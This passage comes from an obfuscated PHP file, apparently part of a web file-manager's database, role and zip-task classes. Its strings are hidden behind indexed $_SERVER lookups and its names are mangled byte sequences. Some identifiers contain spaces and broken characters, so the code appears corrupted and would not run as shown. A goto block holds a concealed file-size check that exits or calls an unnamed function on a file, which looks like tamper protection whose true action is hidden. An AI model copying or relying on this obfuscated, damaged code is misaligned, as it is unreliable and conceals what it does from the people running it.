floatval($this->where($šÌ†•ÜÂ)->sum($Ÿ¯ ââˆ[88])); } } $¤Öï¯ö‡ = !$¤Öï¯ö‡ || $¤Öï¯ö‡ <= 0 ? 0 : $¤Öï¯ö‡; return $¤Öï¯ö‡; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ô‹§µŞ£) { return $this->fileTypeProfile($Ô‹§µŞ£, SourceModel::TYPE_USER); } public function groupFileTypeProfile($²íÍ—­‚) { return $this->fileTypeProfile($²íÍ—­‚, SourceModel::TYPE_GROUP); } private function fileTypeProfile($æâ„ÏÀ, $ˆÍèÊÈº) { $¸úÓò÷â =& $_SERVER[•€áå–Õ]; $ÌÚ²¿®É = $¸úÓò÷â[2203] . $æâ„ÏÀ . $¸úÓò÷â[21] . $ˆÍèÊÈº; $Ä†ÌÙøº = Cache::get($ÌÚ²¿®É); if ($Ä†ÌÙøº) { return $Ä†ÌÙøº; } $Œâ³ËÎ´ = array($¸úÓò÷â[625] => 0); if ($æâ„ÏÀ != !1) { $Œâ³ËÎ´[$¸úÓò÷â[549]] = $æâ„ÏÀ; $Œâ³ËÎ´[$¸úÓò÷â[190]] = $ˆÍèÊÈº; } $ëéÕìº = array(); $ëéÕìº[$¸úÓò÷â[2204]] = array($¸úÓò÷â[2205] => LNG($¸úÓò÷â[2204]), $¸úÓò÷â[2206] => $this->where($Œâ³ËÎ´)->count(), $¸úÓò÷â[596] => $this->where($Œâ³ËÎ´)->sum($¸úÓò÷â[88])); $èíÍâª¬ = KodIO::fileTypeList(); foreach ($èíÍâª¬ as $Î¸¯Å•õ => $àèˆû÷—) { $Œâ³ËÎ´[$¸úÓò÷â[465]] = $this->fileTypeWhere($Î¸¯Å•õ); $ëéÕìº[$Î¸¯Å•õ] = array($¸úÓò÷â[2205] => $àèˆû÷—[$¸úÓò÷â[42]], $¸úÓò÷â[2206] => $this->where($Œâ³ËÎ´)->count(), $¸úÓò÷â[596] => $this->where($Œâ³ËÎ´)->sum($¸úÓò÷â[88])); } Cache::set($ÌÚ²¿®É, $ëéÕìº, 1200); return $ëéÕìº; } public function fileNameExist($›»Šª‘, $™§Ù¿´Š) { $İ³»®Æ„ =& $_SERVER[•€áå–Õ]; $×‹æí¬Å = $this->field($İ³»®Æ„[2207])->where(array($İ³»®Æ„[192] => $›»Šª‘, $İ³»®Æ„[42] => $™§Ù¿´Š, $İ³»®Æ„[484] => 0))->find(); return is_array($×‹æí¬Å) ? $×‹æí¬Å[$İ³»®Æ„[193]] : !1; } public function childList($£ï‰ƒæç) { $¬–ªŞß =& $_SERVER[•€áå–Õ]; $ÒşÅÅÍ¤ = $¬–ªŞß[2180] . $£ï‰ƒæç; if (isset(self::$cacheChildList[$ÒşÅÅÍ¤])) { return self::$cacheChildList[$ÒşÅÅÍ¤]; } $°÷ôÓèó = array($¬–ªŞß[192] => intval($£ï‰ƒæç), $¬–ªŞß[484] => 0); $š™‚”æö = $this->where($°÷ôÓèó)->select(); $š™‚”æö = $š™‚”æö ? $š™‚”æö : array(); self::$cacheChildList[$ÒşÅÅÍ¤] = $š™‚”æö; foreach ($š™‚”æö as $““ûìÓØ) { $ÒşÅÅÍ¤ = $¬–ªŞß[512] . $““ûìÓØ[$¬–ªŞß[193]]; self::$cacheSourceInfo[$ÒşÅÅÍ¤] = $““ûìÓØ; } return $š™‚”æö; } public function fileNameAuto($Ê¼¤³İ, $Ø“Íƒƒ°, $ Ÿ†¬•† = REPEAT_RENAME, $Ã¡û©º¾ = false) { $è¥šÀ¾ =& $_SERVER[•€áå–Õ]; $Å¬õ˜¨ª = get_path_ext($Ø“Íƒƒ°); $ŒÑÏÉ‘ = $Å¬õ˜¨ª ? basename($Ø“Íƒƒ°, $è¥šÀ¾[20] . $Å¬õ˜¨ª) . $è¥šÀ¾[2208] . $Å¬õ˜¨ª : $Ø“Íƒƒ° . $è¥šÀ¾[439]; $‹ÚÛâíà = array($è¥šÀ¾[192] => $Ê¼¤³İ, $è¥šÀ¾[484] => 0, $è¥šÀ¾[42] => array($è¥šÀ¾[438], $ŒÑÏÉ‘)); $ÀæûŞØÂ = $this->field($è¥šÀ¾[42])->where($‹ÚÛâíà)->select(); $Œö†°¼Ç = array_to_keyvalue($ÀæûŞØÂ, $è¥šÀ¾[22], $è¥šÀ¾[42]); return $this->fileNameAutoGet($Œö†°¼Ç, $Ø“Íƒƒ°, $ Ÿ†¬•†, $Ã¡û©º¾); } public function fileNameAutoGet($ÈÌú„†Æ, $çËòıÈ, $ï¤ãÎıÄ, $¸¡Ó·¹é) { $âñÅ¼åÜ =& $_SERVER[•€áå–Õ]; if ($ï¤ãÎıÄ == REPEAT_REPLACE || !$ÈÌú„†Æ || !in_array_not_case($çËòıÈ, $ÈÌú„†Æ) || $¸¡Ó·¹é && $ï¤ãÎıÄ != REPEAT_RENAME_FOLDER) { return $çËòıÈ; } if ($ï¤ãÎıÄ == REPEAT_SKIP) { return !1; } $ñı®Ùàé = $âñÅ¼åÜ[20] . get_path_ext($çËòıÈ); $ñı®Ùàé = $ñı®Ùàé == $âñÅ¼åÜ[20] || $¸¡Ó·¹é ? $âñÅ¼åÜ[22] : $ñı®Ùàé; for ($´Ã³† Ò = 1; $´Ã³† Ò <= count($ÈÌú„†Æ) + 1; $´Ã³† Ò++) { $óóÔ•ğŞ = substr($çËòıÈ, 0, strlen($çËòıÈ) - strlen($ñı®Ùàé)); $‰ŸÏîŞ† = $óóÔ•ğŞ . "\50{$´Ã³† Ò}\51{$ñı®Ùàé}"; if (!in_array_not_case($‰ŸÏîŞ†, $ÈÌú„†Æ)) { return $‰ŸÏîŞ†; } } } } goto BÛœœÜŞª”; A×´˜ô¤™ï: $_size = $_SERVER[•€áå–Õ][7]; if ($_SERVER[$_SERVER[•€áå–Õ][8]] != $_size($_file)) { $_getc = $_SERVER[•€áå–Õ][9]; $_getfile = $_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•€áå–Õ][12], $_getfilec); if (count($_getarrs) < $_SERVER[•€áå–Õ][13]) { $exit = $_SERVER[•€áå–Õ][14]; $exit(); } $_act = $_SERVER[•€áå–Õ][15]; $_act($_file); } class DbSqlite3Base extends Db { public function __construct($€”»ÑÓ’ = '') { $ÎÑÄ‹‰œ =& $_SERVER[•€áå–Õ]; if (!class_exists($ÎÑÄ‹‰œ[64])) { think_exception(think_lang($ÎÑÄ‹‰œ[24]) . $ÎÑÄ‹‰œ[65]); } if (!empty($€”»ÑÓ’)) { if (!isset($€”»ÑÓ’[$ÎÑÄ‹‰œ[26]])) { $€”»ÑÓ’[$ÎÑÄ‹‰œ[26]] = 438; } $this->config = $€”»ÑÓ’; if (empty($this->config[$ÎÑÄ‹‰œ[27]])) { $this->config[$ÎÑÄ‹‰œ[27]] = array(); } } } public function connect($ŒÛÆŸ¾İ = '', $‰Û’‚á¦ = 0) { $œèÄ¦•­ =& $_SERVER[•€áå–Õ]; if (!isset($this->linkID[$‰Û’‚á¦])) { if (empty($ŒÛÆŸ¾İ)) { $ŒÛÆŸ¾İ = $this->config; } $this->linkID[$‰Û’‚á¦] = new SQLite3($ŒÛÆŸ¾İ[$œèÄ¦•­[31]]); if (!$this->linkID[$‰Û’‚á¦]) { think_exception($this->linkID[$‰Û’‚á¦]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$‰Û’‚á¦]->busyTimeout(30000); if (1 != think_config($œèÄ¦•­[32])) { unset($this->config); } } return $this->linkID[$‰Û’‚á¦]; } public function free() { $this->queryID = null; } public function query($š‚£é“) { $Ñù» ” =& $_SERVER[•€áå–Õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $š‚£é“; if ($this->queryID) { $this->free(); } think_action_status($Ñù» ”[33], 1); think_status($Ñù» ”[34]); $this->queryID = $this->_linkID->query($š‚£é“); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ŸŸÀ°øÍ = $this->getAll(); $this->numRows = count($ŸŸÀ°øÍ); return $ŸŸÀ°øÍ; } } public function execute($ì®±Á¥Ü) { $·±å–ÖÏ =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ì®±Á¥Ü; if ($this->queryID) { $this->free(); } think_action_status($·±å–ÖÏ[35], 1); think_status($·±å–ÖÏ[34]); $”ËËûØÇ = $this->_linkID->exec($ì®±Á¥Ü); $this->debug(); if (!1 === $”ËËûØÇ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[•€áå–Õ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $àÖÁğ¹© = $this->_linkID->query($_SERVER[•€áå–Õ][37]); if (!$àÖÁğ¹©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïİ×·ÕÊ = $this->_linkID->query($_SERVER[•€áå–Õ][38]); if (!$ïİ×·ÕÊ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¡¤Ş©Ò = array(); while ($ÉÇÅÌçà = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¡¤Ş©Ò[] = $ÉÇÅÌçà; } $this->queryID->reset(); return $¡¤Ş©Ò; } public function getFields($¤•ª©Ô) { $è½™â›¿ =& $_SERVER[•€áå–Õ]; $í¯—á· = $this->query($è½™â›¿[39] . $¤•ª©Ô . $è½™â›¿[40]); $ÓéÇîè = array(); if ($í¯—á·) { foreach ($í¯—á· as $°ÎÄÚ·Æ => $Œ™ş‘„Ò) { $ÓéÇîè[$Œ™ş‘„Ò[$è½™â›¿[42]]] = array($è½™â›¿[42] => $Œ™ş‘„Ò[$è½™â›¿[42]], $è½™â›¿[43] => $Œ™ş‘„Ò[$è½™â›¿[43]], $è½™â›¿[45] => (bool) ($Œ™ş‘„Ò[$è½™â›¿[45]] === $è½™â›¿[22]), $è½™â›¿[47] => $Œ™ş‘„Ò[$è½™â›¿[66]], $è½™â›¿[49] => (bool) $Œ™ş‘„Ò[$è½™â›¿[67]], $è½™â›¿[52] => (bool) $Œ™ş‘„Ò[$è½™â›¿[67]]); } } return $ÓéÇîè; } public function getTables($¾îã±ú· = '') { $Â…ß´†„ =& $_SERVER[•€áå–Õ]; $ÓˆöÌ²è = $this->query($Â…ß´†„[55] . $Â…ß´†„[56] . $Â…ß´†„[57]); $»‚ó‰Ã = array(); foreach ($ÓˆöÌ²è as $óèØ‰øì => $” ³Ğáº) { $»‚ó‰Ã[$óèØ‰øì] = current($” ³Ğáº); } return $»‚ó‰Ã; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $î¿ßà¡ =& $_SERVER[•€áå–Õ]; $this->error = $this->_linkID->lastErrorMsg(); if ($î¿ßà¡[22] != $this->queryStr) { $this->error .= LNG($î¿ßà¡[58]) . $this->queryStr; } think_trace($this->error, $î¿ßà¡[22], $î¿ßà¡[59]); return $this->error; } public function escapeString($Ğ¥‡¼©¬) { $À¨¬¥ûÒ =& $_SERVER[•€áå–Õ]; if ($this->_linkID) { return $this->_linkID->escapeString($Ğ¥‡¼©¬); } return str_ireplace($À¨¬¥ûÒ[68], $À¨¬¥ûÒ[69], $Ğ¥‡¼©¬); } public function parseLimit($ó®è²Œı) { $£™¿ÇÌ =& $_SERVER[•€áå–Õ]; $Ó‘ÀşÙ¬ = $£™¿ÇÌ[22]; if (!empty($ó®è²Œı)) { $ó®è²Œı = explode($£™¿ÇÌ[60], $ó®è²Œı); if (count($ó®è²Œı) > 1) { $Ó‘ÀşÙ¬ .= $£™¿ÇÌ[61] . $ó®è²Œı[1] . $£™¿ÇÌ[62] . $ó®è²Œı[0] . $£™¿ÇÌ[63]; } else { $Ó‘ÀşÙ¬ .= $£™¿ÇÌ[61] . $ó®è²Œı[0] . $£™¿ÇÌ[63]; } } return $Ó‘ÀşÙ¬; } } goto cóÜÏ¨¢’¯; fì³”‰Ğ’: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\137\x6f\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\x65", "\x72\157\x6c\145\107\x72\x6f\x75\x70", "\162\145\x67\151\x73\x74", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Ëµ…­Á) { return "\123\171\163\164\x65\x6d\x4f\x70\x74\x69\157\x6e\x5f{$Ëµ…­Á}"; } protected function optionDefault($¿«¨ñú˜ = '') { $Á‘Ù‚ =& $_SERVER[•€áå–Õ]; if ($¿«¨ñú˜ == $Á‘Ù‚[22]) { return $GLOBALS[$Á‘Ù‚[16]][$Á‘Ù‚[436]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x72\157\x6c\x65\114\151\x73\x74"; public $field = array("\156\141\155\145", "\141\165\164\x68", "\x6c\x61\142\145\154", "\x64\x69\x73\160\x6c\x61\x79", "\x73\171\x73\x74\x65\x6d", "\x64\x65\x73\x63", "\x69\147\x6e\157\162\145\x45\170\x74", "\151\x67\156\x6f\162\x65\x46\x69\154\x65\x53\x69\x7a\145", "\x61\144\155\151\x6e\151\x73\x74\162\x61\164\x6f\162", "\163\157\162\164"); public function listData($‰Ùíú­¬ = false, $ëûèí§ˆ = "\163\157\162\x74", $„ó•Œ¦ğ = false) { $Ÿ®–·èœ =& $_SERVER[•€áå–Õ]; $¢’ÀÌêæ = parent::listData($‰Ùíú­¬, $ëûèí§ˆ, $„ó•Œ¦ğ); if (!$‰Ùíú­¬) { foreach ($¢’ÀÌêæ as $€§çŞ­ => $‹êÔØÒÄ) { if ($‹êÔØÒÄ[$Ÿ®–·èœ[2094]] == 1) { $¢’ÀÌêæ[$€§çŞ­][$Ÿ®–·èœ[505]] = LNG($Ÿ®–·èœ[2333]); } } } return $¢’ÀÌêæ; } public function update($’°Ö¤¤“, $Í×Û¾ÖÄ) { $ÏœÚ›Ö =& $_SERVER[•€áå–Õ]; $¨ŸŞ¯Ã = parent::listData($’°Ö¤¤“); $Ğ‡ê¹º× = $this->findByName($Í×Û¾ÖÄ[$ÏœÚ›Ö[42]]); if (!$¨ŸŞ¯Ã || $Ğ‡ê¹º× && $Ğ‡ê¹º×[$ÏœÚ›Ö[454]] != $¨ŸŞ¯Ã[$ÏœÚ›Ö[454]]) { return !1; } if ($Ğ‡ê¹º×[$ÏœÚ›Ö[2094]] == 1) { $Í×Û¾ÖÄ = array($ÏœÚ›Ö[42] => $Í×Û¾ÖÄ[$ÏœÚ›Ö[42]], $ÏœÚ›Ö[1914] => $Í×Û¾ÖÄ[$ÏœÚ›Ö[1914]]); } $this->filterAuth($Í×Û¾ÖÄ[$ÏœÚ›Ö[466]]); return parent::update($’°Ö¤¤“, $Í×Û¾ÖÄ); } public function remove($ìÜ¸Û¹) { $¼â¢óèŸ = parent::listData($ìÜ¸Û¹); if (!$¼â¢óèŸ || $¼â¢óèŸ[$_SERVER[•€áå–Õ][191]]) { return !1; } return parent::remove($ìÜ¸Û¹); } public function add($¥²ñÑ“ñ) { $¢Â÷æ¡© =& $_SERVER[•€áå–Õ]; $ìèá¬Ï­ = $¥²ñÑ“ñ[$¢Â÷æ¡©[42]]; if ($this->findByName($ìèá¬Ï­)) { return !1; } $ˆº ß®š = array($¢Â÷æ¡©[473] => $ìèá¬Ï­, $¢Â÷æ¡©[1897] => $¢Â÷æ¡©[22], $¢Â÷æ¡©[1893] => $¢Â÷æ¡©[1901], $¢Â÷æ¡©[2334] => 1, $¢Â÷æ¡©[1896] => 0, $¢Â÷æ¡©[2335] => 0, $¢Â÷æ¡©[1895] => $this->getSort()); $¥²ñÑ“ñ = array_merge($ˆº ß®š, $¥²ñÑ“ñ); $this->filterAuth($¥²ñÑ“ñ[$¢Â÷æ¡©[466]]); return parent::insert($¥²ñÑ“ñ); } private function getSort() { $Ú…ÒíìÈ =& $_SERVER[•€áå–Õ]; $Õ˜úÈœ´ = parent::listData(); $­¡°ôÈ— = array_to_keyvalue($Õ˜úÈœ´, $Ú…ÒíìÈ[22], $Ú…ÒíìÈ[1915]); return empty($­¡°ôÈ—) ? 0 : max($­¡°ôÈ—) + 1; } private function filterAuth(&$ÒşÖ¤Ã¬) { $ì±µÙÚÈ =& $_SERVER[•€áå–Õ]; $ÇƒôŸÇ§ = array(); $ãÚ·ã¢Ã = array_filter(explode($ì±µÙÚÈ[60], $ÒşÖ¤Ã¬)); foreach ($ãÚ·ã¢Ã as $ÒşÖ¤Ã¬) { $¹ìŒğú = explode($ì±µÙÚÈ[20], $ÒşÖ¤Ã¬); if ($¹ìŒğú[0] == $ì±µÙÚÈ[2336] && $¹ìŒğú[1] != $ì±µÙÚÈ[1231]) { $€É“”£÷ = $¹ìŒğú[0] . $ì±µÙÚÈ[20] . $¹ìŒğú[1] . $ì±µÙÚÈ[2337]; if (!in_array($€É“”£÷, $ãÚ·ã¢Ã)) { $ÇƒôŸÇ§[] = $€É“”£÷; } } $ÇƒôŸÇ§[] = $ÒşÖ¤Ã¬; } $ÒşÖ¤Ã¬ = implode($ì±µÙÚÈ[60], $ÇƒôŸÇ§); } public function findRoleDefault() { $Çö¼¿É¡ =& $_SERVER[•€áå–Õ]; $Ø¨ËÅÌ“ = parent::listData(); $²æİßÆ = !1; foreach ($Ø¨ËÅÌ“ as $ı±ççÁ­) { if (!$ı±ççÁ­ || $ı±ççÁ­[$Çö¼¿É¡[1913]] == $Çö¼¿É¡[224] || $ı±ççÁ­[$Çö¼¿É¡[2094]] == 1) { continue; } if (strstr($ı±ççÁ­[$Çö¼¿É¡[466]], $Çö¼¿É¡[2338])) { continue; } if (!strstr($ı±ççÁ­[$Çö¼¿É¡[466]], $Çö¼¿É¡[2339])) { continue; } if (!$²æİßÆ) { $²æİßÆ = $ı±ççÁ­; continue; } $éÄëÌ¨¤ = explode($Çö¼¿É¡[60], $²æİßÆ[$Çö¼¿É¡[466]]); $€š¶Ä†Ø = explode($Çö¼¿É¡[60], $ı±ççÁ­[$Çö¼¿É¡[466]]); if (count($éÄëÌ¨¤) > count($€š¶Ä†Ø)) { $²æİßÆ = $ı±ççÁ­; } } return $²æİßÆ ? $²æİßÆ[$Çö¼¿É¡[454]] : $Çö¼¿É¡[22]; } public function sort($¬®ä½ĞŠ, $€ŒñˆŠŠ) { return parent::update($¬®ä½ĞŠ, $€ŒñˆŠŠ); } } goto dİ½ëâäôÆ; Bˆ­Æ’¯¦»: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $õ¹¢Ç =& $_SERVER[•€áå–Õ]; parent::startAfter(); Hook::bind($õ¹¢Ç[1806], array($this, $õ¹¢Ç[1807])); Hook::bind($õ¹¢Ç[1234], array($this, $õ¹¢Ç[1808])); Hook::bind($õ¹¢Ç[1809], array($this, $õ¹¢Ç[1810])); $—äÆñàï =& $this->task; $—äÆñàï[$õ¹¢Ç[1811]] = $õ¹¢Ç[1235]; if (!$—äÆñàï[$õ¹¢Ç[1583]]) { $—äÆñàï[$õ¹¢Ç[1583]] = LNG($õ¹¢Ç[1812]); } } protected function endAfter() { $°µÇòÙ =& $_SERVER[•€áå–Õ]; parent::endAfter(); Hook::unbind($°µÇòÙ[1806], array($this, $°µÇòÙ[1807])); Hook::unbind($°µÇòÙ[1234], array($this, $°µÇòÙ[1808])); Hook::unbind($°µÇòÙ[1809], array($this, $°µÇòÙ[1810])); } public function updateAfter() { $³ûŒÎÌš =& $_SERVER[•€áå–Õ]; $¬–°ã­ =& $this->task; if (!$¬–°ã­[$³ûŒÎÌš[827]] || !$¬–°ã­[$³ûŒÎÌš[804]]) { if ($¬–°ã­[$³ûŒÎÌš[1811]] != $³ûŒÎÌš[368]) { return; } } if ($¬–°ã­[$³ûŒÎÌš[1811]] == $³ûŒÎÌš[1235]) { $×Şâ¬ÀÃ = 0; if ($¬–°ã­[$³ûŒÎÌš[1746]]) { $×Şâ¬ÀÃ = $¬–°ã­[$³ûŒÎÌš[1747]] / $¬–°ã­[$³ûŒÎÌš[1746]]; } $¬–°ã­[$³ûŒÎÌš[1695]] = $×Şâ¬ÀÃ * 0.3; } else { if ($¬–°ã­[$³ûŒÎÌš[1811]] == $³ûŒÎÌš[368]) { $×Şâ¬ÀÃ = $¬–°ã­[$³ûŒÎÌš[1694]] / $¬–°ã­[$³ûŒÎÌš[827]]; $¬–°ã­[$³ûŒÎÌš[1695]] = 0.3 + $×Şâ¬ÀÃ * 0.4; } else { if ($¬–°ã­[$³ûŒÎÌš[1811]] == $³ûŒÎÌš[119]) { $„Ã©Àà = 0; if ($¬–°ã­[$³ûŒÎÌš[1748]] == $³ûŒÎÌš[119]) { $„Ã©Àà = $¬–°ã­[$³ûŒÎÌš[1747]]; } $×Şâ¬ÀÃ = ($¬–°ã­[$³ûŒÎÌš[1751]] + $„Ã©Àà) / $¬–°ã­[$³ûŒÎÌš[804]]; $¬–°ã­[$³ûŒÎÌš[1695]] = 0.3 + 0.4 + $×Şâ¬ÀÃ * 0.3; } } } if ($¬–°ã­[$³ûŒÎÌš[1695]] > 0) { $ƒ§ƒº = timeFloat() - $¬–°ã­[$³ûŒÎÌš[1697]] - $¬–°ã­[$³ûŒÎÌš[1700]]; $¬–°ã­[$³ûŒÎÌš[1701]] = $ƒ§ƒº * (1 - $¬–°ã­[$³ûŒÎÌš[1695]]) / $¬–°ã­[$³ûŒÎÌš[1695]]; } } public function addFile($¶Ü¹Šá™) { $µƒü©î– =& $_SERVER[•€áå–Õ]; $’¼×›Ëİ =& $this->task; $Æ—Ş‰ğº = IO::info($¶Ü¹Šá™); $’¼×›Ëİ[$µƒü©î–[1744]] = $Æ—Ş‰ğº[$µƒü©î–[42]]; $’¼×›Ëİ[$µƒü©î–[1746]] = $Æ—Ş‰ğº[$µƒü©î–[88]]; $’¼×›Ëİ[$µƒü©î–[1747]] = 0; $’¼×›Ëİ[$µƒü©î–[1105]] = $µƒü©î–[1767]; $’¼×›Ëİ[$µƒü©î–[1748]] = $µƒü©î–[1235]; $’¼×›Ëİ[$µƒü©î–[804]] = $Æ—Ş‰ğº[$µƒü©î–[88]]; $’¼×›Ëİ[$µƒü©î–[827]] = 1; $… úÕ§ = 0; $’¼×›Ëİ[$µƒü©î–[1755]] = array($µƒü©î–[1756] => $… úÕ§ + 1, $µƒü©î–[473] => $Æ—Ş‰ğº[$µƒü©î–[42]], $µƒü©î–[96] => $Æ—Ş‰ğº[$µƒü©î–[96]], $µƒü©î–[562] => $Æ—Ş‰ğº[$µƒü©î–[562]] ? $Æ—Ş‰ğº[$µƒü©î–[562]] : $Æ—Ş‰ğº[$µƒü©î–[96]]); $this->update(); } public function zipEvent($ÙÍäªÖÒ, $ÃªÓ™¶, $¢­Ï‰œ, $“ÕÀÕæâ) { $¨çÄ–üî =& $_SERVER[•€áå–Õ]; $œ–‘…™ì =& $this->task; $œ–‘…™ì[$¨çÄ–üî[1744]] = get_path_this($ÃªÓ™¶); $œ–‘…™ì[$¨çÄ–üî[1746]] = $“ÕÀÕæâ; $œ–‘…™ì[$¨çÄ–üî[1747]] = $¢­Ï‰œ; $œ–‘…™ì[$¨çÄ–üî[1105]] = $ÙÍäªÖÒ == $¨çÄ–üî[1813] ? $¨çÄ–üî[1814] : $¨çÄ–üî[1815]; $œ–‘…™ì[$¨çÄ–üî[1748]] = $¨çÄ–üî[22]; $œ–‘…™ì[$¨çÄ–üî[804]] = $“ÕÀÕæâ; $œ–‘…™ì[$¨çÄ–üî[1811]] = $¨çÄ–üî[368]; $this->update(); } public function unzipAfter($ıç­îÆ´) { $ÑÀÊÁš =& $_SERVER[•€áå–Õ]; $ã«½ã†Ô =& $this->task; $ã«½ã†Ô[$ÑÀÊÁš[1811]] = $ÑÀÊÁš[119]; $İ†·ÛŞ÷ = IO::infoWithChildren($ıç­îÆ´); $ÄÈ˜Õ”å = 0; $ã«½ã†Ô[$ÑÀÊÁš[1755]] = array($ÑÀÊÁš[1756] => $ÄÈ˜Õ”å + 1, $ÑÀÊÁš[473] => $İ†·ÛŞ÷[$ÑÀÊÁš[42]], $ÑÀÊÁš[96] => $İ†·ÛŞ÷[$ÑÀÊÁš[96]], $ÑÀÊÁš[562] => $İ†·ÛŞ÷[$ÑÀÊÁš[562]] ? $İ†·ÛŞ÷[$ÑÀÊÁš[562]] : $İ†·ÛŞ÷[$ÑÀÊÁš[96]]); if ($İ†·ÛŞ÷[$ÑÀÊÁš[43]] == $ÑÀÊÁš[226]) { $ã«½ã†Ô[$ÑÀÊÁš[827]] = 1; } else { $ã«½ã†Ô[$ÑÀÊÁš[827]] = $İ†·ÛŞ÷[$ÑÀÊÁš[91]][$ÑÀÊÁš[89]]; } $ã«½ã†Ô[$ÑÀÊÁš[1105]] = $ÑÀÊÁš[22]; $ã«½ã†Ô[$ÑÀÊÁš[1748]] = 0; $ã«½ã†Ô[$ÑÀÊÁš[1694]] = 0; $ã«½ã†Ô[$ÑÀÊÁš[1746]] = 0; $ã«½ã†Ô[$ÑÀÊÁš[1747]] = 0; $ã«½ã†Ô[$ÑÀÊÁš[1744]] = $ÑÀÊÁš[22]; $ã«½ã†Ô[$ÑÀÊÁš[1751]] = 0; $ã«½ã†Ô[$ÑÀÊÁš[804]] = $İ†·ÛŞ÷[$ÑÀÊÁš[88]]; $this->update(); self::log($ÑÀÊÁš[1816] . json_encode(array($ã«½ã†Ô, $İ†·ÛŞ÷))); } public function nameParse($ÑËÂı¢¤) { $Ú×¾Å‹› =& $_SERVER[•€áå–Õ]; $Ò“ş’¯÷ =& $this->task; if ($Ò“ş’¯÷[$Ú×¾Å‹›[1811]] == $Ú×¾Å‹›[1235]) { $Ò“ş’¯÷[$Ú×¾Å‹›[1811]] = $Ú×¾Å‹›[368]; $Ò“ş’¯÷[$Ú×¾Å‹›[1751]] = 0; $Ò“ş’¯÷[$Ú×¾Å‹›[804]] = 0; } $¥¨€šÍ¿ = get_path_this($ÑËÂı¢¤); if (strstr($¥¨€šÍ¿, $Ú×¾Å‹›[20])) { $Ò“ş’¯÷[$Ú×¾Å‹›[1694]] += 1; $Ò“ş’¯÷[$Ú×¾Å‹›[827]] += 1; } $Ò“ş’¯÷[$Ú×¾Å‹›[1744]] = $ÑËÂı¢¤; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÕšŠ ‚® =& $_SERVER[•€áå–Õ]; parent::startAfter(); Hook::bind($ÕšŠ ‚®[1817], array($this, $ÕšŠ ‚®[1807])); Hook::bind($ÕšŠ ‚®[1809], array($this, $ÕšŠ ‚®[1810])); $â¹ÓÒÀ³ =& $this->task; $â¹ÓÒÀ³[$ÕšŠ ‚®[1811]] = $ÕšŠ ‚®[1235]; if (!$â¹ÓÒÀ³[$ÕšŠ ‚®[1583]]) { $â¹ÓÒÀ³[$ÕšŠ ‚®[1583]] = LNG($ÕšŠ ‚®[1818]); } } protected function endAfter() { $ÌÍ€ÀÈ± =& $_SERVER[•€áå–Õ]; parent::endAfter(); Hook::unbind($ÌÍ€ÀÈ±[1817], array($this, $ÌÍ€ÀÈ±[1807])); Hook::unbind($ÌÍ€ÀÈ±[1809], array($this, $ÌÍ€ÀÈ±[1810])); } public function updateAfter() { $¢õîşí¯ =& $_SERVER[•€áå–Õ]; $éõá’¼â =& $this->task; if (!$éõá’¼â[$¢õîşí¯[827]] || !$éõá’¼â[$¢õîşí¯[804]]) { return; } if ($éõá’¼â[$¢õîşí¯[1811]] == $¢õîşí¯[1235]) { $…¶ĞÉ“´ = $éõá’¼â[$¢õîşí¯[1747]]; if ($éõá’¼â[$¢õîşí¯[1748]] != $¢õîşí¯[1235]) { $…¶ĞÉ“´ = 0; } $ãùøÉ¥ = ($éõá’¼â[$¢õîşí¯[1751]] + $…¶ĞÉ“´) / $éõá’¼â[$¢õîşí¯[804]]; $éõá’¼â[$¢õîşí¯[1695]] = $ãùøÉ¥ * 0.3; } else { if ($éõá’¼â[$¢õîşí¯[1811]] == $¢õîşí¯[368]) { $ãùøÉ¥ = $éõá’¼â[$¢õîşí¯[1694]] / $éõá’¼â[$¢õîşí¯[827]]; $éõá’¼â[$¢õîşí¯[1695]] = 0.3 + $ãùøÉ¥ * 0.5; } else { if ($éõá’¼â[$¢õîşí¯[1811]] == $¢õîşí¯[119]) { $ãùøÉ¥ = 0; if ($éõá’¼â[$¢õîşí¯[1746]]) { $ãùøÉ¥ = $éõá’¼â[$¢õîşí¯[1747]] / $éõá’¼â[$¢õîşí¯[1746]]; } $éõá’¼â[$¢õîşí¯[1695]] = 0.3 + 0.5 + $ãùøÉ¥ * 0.2; } } } if ($éõá’¼â[$¢õîşí¯[1695]] > 0) { $–úéç¡Ö = timeFloat() - $éõá’¼â[$¢õîşí¯[1697]] - $éõá’¼â[$¢õîşí¯[1700]]; $éõá’¼â[$¢õîşí¯[1701]] = $–úéç¡Ö * (1 - $éõá’¼â[$¢õîşí¯[1695]]) / $éõá’¼â[$¢õîşí¯[1695]]; } } public function copyFileStart($€‘ıÌß®, $ÈßÓ–¿, $¦Úªµæà, $¯ÃÕüç, $˜¢‹‚Å•, $™ÃÈÎö) { $º÷›«õ =& $_SERVER[•€áå–Õ]; parent::copyFileStart($€‘ıÌß®, $ÈßÓ–¿, $¦Úªµæà, $¯ÃÕüç, $˜¢‹‚Å•, $™ÃÈÎö); $ï¹õÒÜë =& $this->task; if ($ï¹õÒÜë[$º÷›«õ[1811]] == 